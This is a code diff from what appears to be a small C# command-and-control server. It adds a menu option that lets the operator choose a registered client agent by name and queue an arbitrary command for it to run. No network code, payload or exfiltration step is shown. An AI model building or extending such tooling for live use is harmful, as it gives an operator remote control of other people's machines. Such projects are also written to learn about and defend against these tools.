@@ -30,7 +30,7 @@ _________         _________ _               ______   _______
    )_(   |/     \|\_______/|/    )_)       (______/ |/   \__/
                                                              
             ");
-            return "C2 Server User Input\n\t[1] Exit the program\n\t[2] List all Clients";
+            return "C2 Server User Input\n\t[1] Exit the program\n\t[2] List all Clients\n\t[3] Set a Command";
         }
 
         public void MenuInput(){
@@ -50,6 +50,9 @@ _________         _________ _               ______   _______
                         Console.WriteLine("Registered Clients:");
                         ListClients();
                         break;
+                    case "3":
+                        SetCommand();
+                        break;
                     default: 
                         Console.WriteLine("\nInvalid input; Please try again.");
                         break;
@@ -64,10 +67,18 @@ _________         _________ _               ______   _______
             }
         }
 
-        public void SetCommand(Agent agent, string command){
+        public void SetCommand(){
             //set a command for a client to query
             //set the "query buffer" to be json including the hostname and the command
-            agent.commandQue.AddLast(command);
+            Console.WriteLine("Which client would you like to send a command to: ");
+            string client = Console.ReadLine();
+            foreach (var agent in this.listener.agents){
+                if(client == agent.name){
+                    Console.WriteLine("What command do you want to run: ");
+                    string command = Console.ReadLine();
+                    agent.commandQue.AddLast(command);
+                }
+            }
         }
     }
 }
